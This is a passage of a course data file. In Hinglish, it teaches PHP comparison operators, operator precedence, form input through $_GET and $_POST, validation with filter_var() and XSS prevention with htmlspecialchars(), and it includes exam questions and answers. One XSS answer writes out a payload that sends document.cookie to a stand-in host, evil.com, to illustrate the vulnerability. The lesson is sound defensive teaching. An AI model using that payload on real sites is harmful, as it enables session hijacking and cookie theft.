          '| Basis | `==` (equal) | `===` (identical) |\n|---|---|---|\n| Compare karta | Sirf **value** (type juggling ke baad) | **Value + type** dono |\n| `"10" == 10` | `true` | `false` |\n| `0 == "0"` | `true` | `false` |\n| `null == false` | `true` | `false` |\n| Speed | Type convert karta hai, thoda slow | Fast (koi conversion nahi) |\n| Use | Sirf numeric compare | Login, ID, password, API |\n\n**Example:**\n```php\nvar_dump("10" == 10);   // bool(true)\nvar_dump("10" === 10);  // bool(false)\nvar_dump(0 == "apple"); // PHP 8: bool(false), PHP 7: bool(true)\n```\n\n**`===` kyon better:**\n1. **Type conversion nahi** hoti — silent bug nahi aate\n2. `"0"` aur `""` jaisi values galti se equal nahi mani jaati\n3. Security — strict comparison se type-juggling attacks (jaise `0 == "admin"`) nahi hote\n4. Code padhne mein clear — developer ka intent saaf\n\n**Note:** `!=` loose, `!==` strict — same rule applies.\n\n**Exam line:** "`==` value compare karta hai type badal kar, `===` value aur type dono — isliye strict comparison safe hai."',
      },
      {
        question: 'Explain operator precedence and the difference between ++$a and $a++.',
        answer:
          '**Precedence** = kis operator ka kya order. Jo upar hai wo pehle chalta hai:\n\n1. `**` (power)\n2. `++ --` (increment/decrement)\n3. `!`\n4. `* / %`\n5. `+ -`\n6. `.` (concatenation)\n7. `< <= > >=`\n8. `== != === !==`\n9. `&&`\n10. `||`\n11. `??`\n12. `=` `+=` (assignment)\n13. `and` `or` `xor` (sabse kam)\n\n**Example:**\n```php\n$r = 2 + 3 * 4;      // 14 (pehle *)\n$r = (2 + 3) * 4;    // 20 (bracket)\n$s = "Total: " . 2 + 3; // PHP 8: "Total: 5" — + pehle, phir .\n```\n\n**`++$a` (pre-increment):** pehle value 1 badhao, phir use karo\n```php\n$a = 5;\necho ++$a;   // 6\necho $a;     // 6\n```\n\n**`$a++` (post-increment):** pehle purani value do, phir badhao\n```php\n$a = 5;\necho $a++;   // 5\necho $a;     // 6\n```\n\n**Table:**\n| Expression | Print | $a baad mein |\n|---|---|---|\n| `++$a` | 6 | 6 |\n| `$a++` | 5 | 6 |\n\n**Kab farak:** `for ($i = 0; $i < 5; $i++)` mein farak nahi, par `$b = $a++;` ya `$arr[$i++] = x;` mein farak padta hai.\n\n**Exam line:** "`++$a` pehle badha kar deta hai, `$a++` pehle de kar baad mein badhaata hai; precedence na yaad rahe to bracket lagaiye."',
      },
    ],
  },

  // ==========================================================
  // 3.4 — Taking user input and generating output
  // ==========================================================
  {
    id: 'wt-php-input-output',
    number: '3.4',
    title: 'Taking User Input & Generating Output',
    subtitle: 'Form → $_GET / $_POST → validate → escape → HTML',
    icon: 'list',
    accent: '#00ff88',
    englishDefinition:
      'Taking user input in PHP means receiving data that the browser sends with an HTTP request, and reading it through the superglobals $_GET (query string, method GET), $_POST (request body, method POST), $_REQUEST (GET + POST + COOKIE) or $_FILES (uploads), after an HTML form posts the fields whose name attributes become array keys. Since this data is untrusted, the correct sequence is: check it exists (isset(), empty(), $_SERVER["REQUEST_METHOD"] === "POST"), clean it (trim(), stripslashes()), validate it (filter_var() with FILTER_VALIDATE_EMAIL / FILTER_VALIDATE_INT, preg_match(), regex, range checks) and escape it before printing (htmlspecialchars() with ENT_QUOTES and UTF-8, or urlencode()). Generating output means writing a response to the browser with echo, print, printf, print_r or var_dump, embedding variables inside HTML, and preserving line breaks with nl2br(). Both client-side validation (JavaScript, for speed and user experience) and server-side validation (PHP, the only one that is actually trustworthy) should be used, because a browser can be bypassed. Printing raw input is the classic cross-site scripting (XSS) hole.',
    intro:
      'Form submit hote hi user ka data request ke saath server par pahunchta hai — GET mein URL ke through, POST mein body ke through. PHP usse $_GET ya $_POST array mein padhta hai. Yahan sabse zaroori baat: user ka data kabhi bharosa karne layak nahi hota. Pehle check karein ki data aaya bhi hai, phir trim + validate karein (email, number, length), aur print karne se pehle htmlspecialchars() se escape karein. Bina escape kiye print karna XSS ka darwaza kholta hai.',
    sections: [
      {
        type: 'definition',
        kicker: 'Definition',
        title: 'Input lena aur output dena',
        body:
          'Input: HTML form ka har field (name="city") request mein ek key-value pair ban jaata hai; PHP usse $_GET["city"] (GET) ya $_POST["city"] (POST) se padhta hai. $_REQUEST dono ka mix hai, $_FILES upload ke liye. Output: echo / print (print), printf (format), print_r aur var_dump (debug), aur variables ko HTML ke beech likhna. Browser ko hamesha aakhir mein HTML hi milta hai.',
        body2:
          'Security ka order: (1) isset()/empty() se presence, (2) trim() se extra space, (3) filter_var() / preg_match() se validity, (4) htmlspecialchars($v, ENT_QUOTES, "UTF-8") se escape — phir hi echo. Server-side validation compulsory hai; JavaScript wali validation sirf UX ke liye hai, kyunki user use band kar sakta hai.',
        chips: ['$_GET', '$_POST', '$_REQUEST', 'isset()', 'filter_var()', 'htmlspecialchars()', 'echo', 'XSS'],
      },
      {
        type: 'diagram',
        kicker: 'Diagram (Exam Ke Liye)',
        title: 'Form se Output tak — GET vs POST',
        diagram: 'php-form-flow',
        caption:
          'Form submit → data request mein (GET = URL, POST = body) → PHP superglobal se padhta hai → validate → escape → HTML output. Neeche laal box galat tareeka (XSS) aur hara box sahi tareeka dikhata hai.',
      },
      {
        type: 'codeoutput',
        kicker: 'Code + Output',
        title: 'Form + Handler — Poora Example',
        intro:
          'Yahan do files hain: form.html jo data bhejta hai, aur welcome.php jo use padh kar output banata hai. Neeche welcome.php ka output us submission ke liye dikhaya gaya hai jisme name=Riya aur city=Pune bheja gaya.',
        language: 'php',
        filename: 'welcome.php',
        code: `<!-- 1. form.html -->
<form action="welcome.php" method="post">
  Name: <input type="text" name="name"><br>
  City: <input type="text" name="city"><br>
  <button type="submit">Submit</button>
</form>

<!-- 2. welcome.php — alag file, form isi par submit hota hai -->
<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    $name = trim($_POST["name"] ?? "");
    $city = trim($_POST["city"] ?? "");

    if ($name === "" || $city === "") {
        echo "<p>Error: dono field bharein.</p>";
    } else {
        $name = htmlspecialchars($name, ENT_QUOTES, "UTF-8");
        $city = htmlspecialchars($city, ENT_QUOTES, "UTF-8");

        echo "<h2>Welcome, $name!</h2>";
        echo "<p>City: $city</p>";
    }
}
?>`,
        php: `<h2>Welcome, Riya!</h2>
<p>City: Pune</p>`,
        label: 'php welcome.php · POST name=Riya, city=Pune',
        height: 160,
        caption:
          'Form hatne ke baad HTML output hi browser ko jaata hai — browser use heading aur paragraph ki tarah render karta hai. Input khaali hota to Error wali line print hoti.',
      },
      {
        type: 'comparison',
        kicker: 'Comparison Table',
        title: 'GET vs POST',
        columns: ['GET', 'POST'],
        columnColors: ['#00d4ff', '#ff8800'],
        rows: [
          { label: 'Data kahan', values: ['URL ke query string mein — ?name=Riya&city=Pune', 'Request body mein (URL mein nahi)'] },
          { label: 'PHP array', values: ['$_GET', '$_POST'] },
          { label: 'Data limit', values: ['~2000 characters (URL limit)', 'Server limit tak — bahut bada'] },
          { label: 'Dikhta hai?', values: ['Haan — address bar, history, logs', 'Nahi — body chhupi rehti hai'] },
          { label: 'Bookmark / share', values: ['Ho sakta hai', 'Nahi'] },
          { label: 'Use', values: ['Search, filter, pagination', 'Login, password, file upload, payment'] },
          { label: 'Security', values: ['Sirf hiding nahi — HTTPS zaroori', 'HTTPS par safe; dono par bharosa nahi'] },
        ],
      },
      {
        type: 'codeoutput',
        kicker: 'Code + Output',
        title: 'Validate aur Escape — Sahi Tareeka',
        intro:
          'Pehle validation: filter_var() galat email par false deta hai. Phir escaping: htmlspecialchars() HTML ke special characters ko text bana deta hai, isliye attacker ka script chal nahi paata. Dono ka output saath dekh lein.',
        language: 'php',
        filename: 'validate.php',
        code: `<?php
// 1. VALIDATION — data sahi hai ya nahi
$email = "riya@";
var_dump(filter_var($email, FILTER_VALIDATE_EMAIL));   // false

$age = "abc";
var_dump(filter_var($age, FILTER_VALIDATE_INT));       // false

$ok = filter_var("riya@example.com", FILTER_VALIDATE_EMAIL);
echo "Valid email: $ok\\n";

// 2. ESCAPING — output se pehle
$evil = '<script>alert("xss")</script>';

echo $evil;                                        // GALAT: script chal jaata
echo "\\n";
echo htmlspecialchars($evil, ENT_QUOTES, "UTF-8"); // SAHI: text ban gaya
echo "\\n";

// 3. Line break bachaye rakhna
$msg = "Line 1\\nLine 2";
echo nl2br($msg);`,
        php: `bool(false)
bool(false)
Valid email: riya@example.com
<script>alert("xss")</script>
&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
Line 1<br />
Line 2`,
        label: 'php validate.php',
        height: 260,
        caption:
          'Pehli <script> line khatarnaak hai — browser use code samajh kar chala deta hai. Doosri line mein &lt; &gt; &quot; ban gaye, isliye browser use sirf text dikhata hai. Bas yahi escaping ka poora funda hai.',
      },
      {
        type: 'points',
        kicker: 'Exam Points',
        title: 'Input / Output Ke Points',
        points: [
          'Input HTML form se aata hai; har field ka name attribute $_GET/$_POST ka key banta hai.',
          'GET — URL mein, $_GET, limit ~2000 chars, bookmark ho sakta; POST — body mein, $_POST, bada data.',
          '$_REQUEST = GET + POST + COOKIE ka mix; debug ke liye theek, decision ke liye nahi.',
          'isset() — variable set aur null nahi; empty() — "", 0, "0", null, false, [] sab empty mane jaate hain.',
          'filter_var() se email (FILTER_VALIDATE_EMAIL) aur integer (FILTER_VALIDATE_INT) validate karein.',
          'Output se pehle htmlspecialchars($v, ENT_QUOTES, "UTF-8") — XSS se bachav.',
          'echo multi-value le sakta hai, print ek; printf format deta hai; print_r/var_dump debug ke liye.',
          'nl2br() se \\n browser mein <br /> ban jaata hai.',
          'Server-side validation compulsory — JavaScript wali bypass ho sakti hai.',
          'Redirect: header("Location: home.php"); exit; — header se pehle koi output nahi hona chahiye.',
        ],
      },
      {
        type: 'recap',
        kicker: 'Recap',
        title: 'Quick Recap',
        points: [
          'Form ka data $_GET ya $_POST mein aata hai; method se decide hota hai.',
          'GET = URL (search), POST = body (login, upload).',
          'Order: isset → trim → validate → escape → echo.',
          'htmlspecialchars() se XSS rukta hai, filter_var() se invalid data.',
          'Output echo/print/printf se; nl2br() se line break.',
          'Server-side validation hi asli validation hai.',
        ],
      },
    ],
    examQuestions: [
      {
        question: 'How does PHP take user input from an HTML form? Explain GET and POST with an example.',
        answer:
          '**Input flow:** HTML form ka `method` aur `action` batate hain data kaise aur kahan jaayega. Har input ka `name` attribute PHP array ka **key** ban jaata hai.\n\n**Example form:**\n```html\n<form action="welcome.php" method="post">\n  Name: <input type="text" name="name">\n  <button type="submit">Submit</button>\n</form>\n```\n\n**Reading in PHP:**\n```php\n$name = $_POST["name"] ?? "";\necho "Hello " . htmlspecialchars($name);\n```\n\n| Basis | GET | POST |\n|---|---|---|\n| Data | URL query string | Request body |\n| Array | `$_GET` | `$_POST` |\n| URL mein dikhta | Haan | Nahi |\n| Limit | ~2000 chars | Bahut bada |\n| Bookmark | Ho sakta | Nahi |\n| Use | Search, filter | Login, password, upload |\n\n**GET example:** `search.php?q=php` → `$_GET["q"]`\n**POST example:** login form → `$_POST["email"]`, `$_POST["password"]`\n\n**Dhyan:** dono ka data user se aata hai — bharosa nahi. `isset()` se check, `trim()` se clean, `filter_var()` se validate, `htmlspecialchars()` se escape.\n\n**Exam line:** "Form ka data method ke hisaab se `$_GET` ya `$_POST` se padha jaata hai; GET URL mein, POST body mein jaata hai."',
      },
      {
        question: 'What is XSS? How do you prevent it while generating output in PHP?',
        answer:
          '**XSS (Cross-Site Scripting):** jab attacker ka diya hua script (usually JavaScript) aapke page par **execute** ho jaata hai, kyunki aapne user input bina escape kiye print kar diya. Isse session cookie chori, fake login form, ya redirect ho sakta hai.\n\n**Khatarnaak code:**\n```php\necho "Hello " . $_GET["name"];\n```\nUser bheje: `?name=<script>document.location="http://evil.com?c="+document.cookie</script>` → script chal jaayega.\n\n**Bachav:**\n1. **htmlspecialchars()** — `<` `>` `"` `\'` `&` ko entities bana do:\n```php\n$safe = htmlspecialchars($_GET["name"], ENT_QUOTES, "UTF-8");\necho "Hello " . $safe;\n```\nOutput: `&lt;script&gt;...` → browser sirf text dikhata hai\n2. **Validation** — `filter_var()`, `preg_match()`, allowed characters\n3. **Length limit** — `mb_substr()`\n4. **`strip_tags()`** — sirf tags hataata hai (escaping se kamzor)\n5. **Context ke hisaab se escape** — HTML mein `htmlspecialchars()`, URL mein `urlencode()`, JS mein `json_encode()`\n6. **CSP header**, cookies par HttpOnly\n\n**Rule:** "Escape on output, validate on input." Data ko store karte waqt nahi, **print karte waqt** escape karein.\n\n**Exam line:** "XSS tab hota hai jab user input bina escape kiye print ho; `htmlspecialchars()` se usse text bana dete hain."',
      },
      {
        question: 'Explain the steps of validating form data in PHP with a complete example.',
        answer:
          '**Validation ke steps:**\n\n1. **Method check** — `$_SERVER["REQUEST_METHOD"] === "POST"`\n2. **Presence check** — `isset()` / `empty()`\n3. **Sanitise** — `trim()`, `stripslashes()`\n4. **Validate** — `filter_var()`, `preg_match()`, length/range\n5. **Errors collect** — array mein, `$errors[]`\n6. **Success par kaam** — DB insert / e-mail / `header("Location: thankyou.php")`\n7. **Output escape** — `htmlspecialchars()`\n\n**Complete example:**\n```php\n<?php\n$errors = [];\n\nif ($_SERVER["REQUEST_METHOD"] === "POST") {\n    $name  = trim($_POST["name"] ?? "");\n    $email = trim($_POST["email"] ?? "");\n    $age   = trim($_POST["age"] ?? "");\n\n    if ($name === "") $errors[] = "Name required";\n    if (!filter_var($email, FILTER_VALIDATE_EMAIL))\n        $errors[] = "Email invalid";\n    if (!filter_var($age, FILTER_VALIDATE_INT, ["options" => ["min_range" => 18]]))\n        $errors[] = "Age 18+ honi chahiye";\n\n    if (!$errors) {\n        echo "<p>Welcome " . htmlspecialchars($name, ENT_QUOTES) . "</p>";\n    }\n}\n?>\n```\n\n**Client-side vs server-side:**\n| Basis | JavaScript | PHP (server) |\n|---|---|---|\n| Speed | Turant | Round trip lagta hai |\n| Bypass | Aasani se ho sakta | Nahi |\n| Role | UX | **Asli security** |\n\n**Exam line:** "Validation server par compulsory hai — browser wali validation sirf user ki suvidha ke liye hoti hai."',
      },
    ],
  },
];
